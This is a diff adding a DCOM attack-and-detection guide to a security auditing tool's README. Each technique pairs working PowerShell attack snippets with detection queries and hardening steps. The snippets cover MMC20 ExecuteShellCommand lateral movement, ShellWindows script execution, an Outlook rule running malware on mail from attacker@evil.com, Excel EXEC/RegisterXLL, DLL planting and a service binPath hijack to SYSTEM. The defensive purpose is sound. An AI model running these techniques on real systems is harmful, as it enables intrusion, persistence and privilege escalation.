@@ -160,6 +160,331 @@ The generated reports include:
    - Specific remediation steps
    - References to Microsoft guidance
 
+# DCOM Attack Examples & Detection Guide
+
+This section provides real-world examples of how DCOM can be abused for lateral movement, privilege escalation, and persistence. Each example includes detection methods and prevention strategies.
+
+## Common DCOM Attack Techniques
+
+### 1. Lateral Movement via MMC20.Application
+
+**MITRE ATT&CK:** T1021.003 - Remote Services: Distributed Component Object Model
+
+**Attack Description:**
+Adversaries use the MMC20.Application COM object to execute commands on remote systems.
+
+**Attack Example:**
+```powershell
+# Attacker connects to remote DCOM
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.100"))
+
+# Execute command via MMC
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c powershell.exe -enc <base64_payload>","7")
+```
+
+**What Makes This Vulnerable:**
+- MMC20.Application exposes `ExecuteShellCommand` method
+- Often has permissions for "Authenticated Users"
+- Allows remote activation by default
+
+**Detection:**
+```powershell
+# Check Event Log for DCOM activation
+Get-WinEvent -FilterHashtable @{LogName='System'; ID=10028} | 
+    Where-Object {$_.Message -match 'MMC20.Application'}
+
+# Monitor for remote DCOM connections
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
+    Where-Object {$_.Message -match 'DCOM'}
+```
+
+**Prevention:**
+- Remove remote launch/activation permissions
+- Restrict to specific admin accounts only
+- Enable DCOM authentication level 6 (Packet Privacy)
+
+### 2. ShellWindows/ShellBrowserWindow Abuse
+
+**MITRE ATT&CK:** T1021.003, T1055.001
+
+**Attack Description:**
+Abuse Internet Explorer COM objects for stealthy code execution.
+
+**Attack Example:**
+```powershell
+# Get ShellWindows object
+$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target.domain.com"))
+
+# Get Item (Internet Explorer instance)
+$item = $com.Item()
+
+# Navigate to execute payload
+$item.Navigate("javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe')")
+
+# Or inject into existing IE process
+$item.Document.parentWindow.execScript("var x=new ActiveXObject('WScript.Shell');x.Run('calc.exe');","JScript")
+```
+
+**What Makes This Vulnerable:**
+- Often runs in context of logged-in user
+- Can access existing browser sessions
+- Bypasses many application controls
+
+**Detection:**
+```powershell
+# Monitor for suspicious IE automation
+Get-WmiObject Win32_Process | Where-Object {
+    $_.Name -eq "iexplore.exe" -and 
+    $_.CommandLine -match "Embedding"
+}
+
+# Check for DCOM access to ShellWindows
+auditpol /set /subcategory:"DCOM Server Security Check" /success:enable /failure:enable
+```
+
+### 3. Outlook.Application for Persistence
+
+**MITRE ATT&CK:** T1137.001 - Office Application Startup
+
+**Attack Example:**
+```powershell
+# Create Outlook COM object
+$outlook = New-Object -ComObject Outlook.Application
+
+# Access MAPI namespace
+$namespace = $outlook.GetNameSpace("MAPI")
+
+# Create malicious rule for persistence
+$rules = $namespace.DefaultStore.GetRules()
+$rule = $rules.Create("SecurityUpdate", 0)
+$rule.Conditions.SenderEmailAddress.Address = "attacker@evil.com"
+$rule.Actions.Run.Enabled = $true
+$rule.Actions.Run.FilePath = "C:\Windows\Temp\malware.exe"
+$rules.Save()
+```
+
+**What Makes This Vulnerable:**
+- Outlook COM object often accessible to all users
+- Can create rules that execute programs
+- Persists across reboots
+
+**Detection:**
+- Monitor registry: `HKCU\Software\Microsoft\Office\Outlook\Security`
+- Check for unusual Outlook rules
+- Monitor process creation from OUTLOOK.EXE
+
+### 4. Excel.Application for Macro-less Code Execution
+
+**MITRE ATT&CK:** T1218 - Living Off the Land
+
+**Attack Example:**
+```powershell
+# Create Excel COM object
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
+$excel.Visible = $false
+
+# Execute via Excel 4.0 macros (no VBA needed)
+$workbook = $excel.Workbooks.Add()
+$sheet = $workbook.Sheets.Item(1)
+
+# Use Excel 4.0 EXEC function
+$sheet.Cells.Item(1,1).Formula = "=EXEC(""cmd.exe /c calc.exe"")"
+$sheet.Calculate()
+
+# Or use RegisterXLL for DLL execution
+$excel.RegisterXLL("C:\temp\malicious.dll")
+```
+
+**Detection:**
+```powershell
+# Monitor Excel launching child processes
+Get-WmiObject Win32_Process | Where-Object {
+    $_.ParentProcessId -in (Get-Process EXCEL).Id
+}
+
+# Check for Excel 4.0 macro usage
+Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Excel\XLSTART" -Recurse
+```
+
+### 5. DLL Hijacking via DCOM
+
+**MITRE ATT&CK:** T1574.001 - DLL Search Order Hijacking
+
+**Attack Scenario:**
+```powershell
+# Auditor finds writable DLL path
+[DLL RISK] Writable Directory - C:\Program Files\CommonApp\
+    Issue: Directory allows DLL planting
+    Writable by: BUILTIN\Users
+
+# Attacker plants malicious DLL
+Copy-Item malicious.dll "C:\Program Files\CommonApp\legitimate.dll"
+
+# Trigger DCOM to load the DLL
+$com = New-Object -ComObject "VulnerableApp.Application"
+# Malicious DLL executes with DCOM privileges
+```
+
+**Detection:**
+```powershell
+# Monitor DLL loads by DCOM
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=7} |
+    Where-Object {$_.Message -match 'dllhost.exe'}
+
+# Check for unsigned DLLs in DCOM paths
+Get-AuthenticodeSignature "C:\Program Files\*\*.dll" | 
+    Where-Object {$_.Status -ne "Valid"}
+```
+
+### 6. Service Privilege Escalation via DCOM
+
+**MITRE ATT&CK:** T1543.003 - Windows Service
+
+**Attack Scenario:**
+When DCOM objects run as Windows services with weak permissions:
+
+```powershell
+# Auditor output shows:
+[SERVICE RISK] Weak permissions on service: DCOMService
+    Vulnerable to: BUILTIN\Users
+    Executable: C:\Program Files\App\service.exe
+
+# Attacker modifies service binary path
+sc config DCOMService binPath= "C:\Windows\Temp\evil.exe"
+
+# Restart service to execute with SYSTEM privileges
+Restart-Service DCOMService
+```
+
+## Monitoring & Detection Strategy
+
+### 1. Enable DCOM Logging
+
+```powershell
+# Enable DCOM logging
+auditpol /set /subcategory:"DCOM Server Security Check" /success:enable /failure:enable
+
+# Monitor these Event IDs:
+# 10028 - DCOM access denied
+# 10036 - DCOM authentication failure  
+# 10037 - DCOM custom error
+```
+
+### 2. Sysmon Configuration for DCOM
+
+```xml
+<Sysmon>
+  <RuleGroup>
+    <!-- Monitor DCOM process creation -->
+    <ProcessCreate onmatch="include">
+      <ParentImage condition="contains">dllhost.exe</ParentImage>
+    </ProcessCreate>
+    
+    <!-- Monitor DCOM network connections -->
+    <NetworkConnect onmatch="include">
+      <Image condition="end with">dllhost.exe</Image>
+      <DestinationPort>135</DestinationPort>
+    </NetworkConnect>
+    
+    <!-- Monitor Registry access to DCOM keys -->
+    <RegistryEvent onmatch="include">
+      <TargetObject condition="contains">HKLM\SOFTWARE\Classes\AppID</TargetObject>
+    </RegistryEvent>
+  </RuleGroup>
+</Sysmon>
+```
+
+### 3. PowerShell Script Block Logging
+
+```powershell
+# Enable PowerShell logging to catch DCOM abuse
+$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
+Set-ItemProperty -Path "$basePath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+
+# Monitor for DCOM-related commands
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
+    Where-Object {$_.Message -match 'GetTypeFromCLSID|GetTypeFromProgID|CreateInstance'}
+```
+
+### 4. Network Detection
+
+```powershell
+# Monitor RPC/DCOM traffic (port 135)
+netsh trace start capture=yes tracefile=dcom.etl provider=Microsoft-Windows-RPC
+
+# Check for lateral movement patterns
+Get-NetTCPConnection | Where-Object {
+    $_.RemotePort -eq 135 -and 
+    $_.State -eq "Established"
+}
+```
+
+## Prevention Checklist
+
+### Immediate Actions
+1. ✅ Remove "Everyone" and "Authenticated Users" from all DCOM permissions
+2. ✅ Disable remote launch/activation for non-essential DCOM objects
+3. ✅ Set DCOM authentication to level 5 or 6
+4. ✅ Fix writable DLL/service paths
+
+### System Hardening
+```powershell
+# Disable DCOM if not needed
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM" -Value 0
+
+# Set authentication level
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "DefaultAuthenticationLevel" -Value 6
+
+# Disable DCOM over HTTP
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOMHTTP" -Value 0
+```
+
+### Application-Specific Hardening
+
+**For MMC20.Application:**
+```powershell
+# Remove remote permissions
+.\DCOM-Remediation-Helper.ps1 -AppID "{49B2791A-B1AE-4C90-9B8E-E860BA07F889}" -RemoveRemoteAccess
+```
+
+**For Office Applications:**
+```powershell
+# Disable COM add-ins
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "DisableAllAddins" -Value 1
+```
+
+## Red Team TTP Summary
+
+| Technique | DCOM Object | Method | Detection Difficulty |
+|-----------|-------------|---------|---------------------|
+| Lateral Movement | MMC20.Application | ExecuteShellCommand | Medium |
+| Process Injection | ShellWindows | Navigate/execScript | High |
+| Persistence | Outlook.Application | Rules.Run | Low |
+| Execution | Excel.Application | RegisterXLL | Medium |
+| Privilege Escalation | Various Services | Service Modification | Low |
+
+## Blue Team Response Playbook
+
+1. **Immediate Response**
+   - Isolate affected systems
+   - Check for persistence mechanisms
+   - Review DCOM access logs
+
+2. **Investigation**
+   - Identify source of DCOM connection
+   - Check for lateral movement indicators
+   - Review authentication logs
+
+3. **Remediation**
+   - Apply DCOM hardening settings
+   - Remove unnecessary permissions
+   - Patch vulnerable services
+
+4. **Long-term Improvements**
+   - Regular DCOM audits
+   - Implement least-privilege model
+   - Deploy EDR with DCOM detection
+
 
 # DCOM Security Monitoring Guide
 
@@ -549,6 +874,11 @@ kql_queries:
 - [DCOM Authentication Hardening](https://techcommunity.microsoft.com/blog/windows-itpro-blog/dcom-authentication-hardening-what-you-need-to-know/3657154)
 - [MS-DCOM Protocol Specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0)
 - [COM Security Best Practices](https://docs.microsoft.com/en-us/windows/win32/com/security-in-com)
+- [Enigma0x3's DCOM Research](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
+- [Cybereason DCOM Lateral Movement](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
+- [FireEye DCOM Abuse](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)
+- [MITRE ATT&CK - DCOM](https://attack.mitre.org/techniques/T1021/003/)
+
 
 ## 🤝 Contributing
 
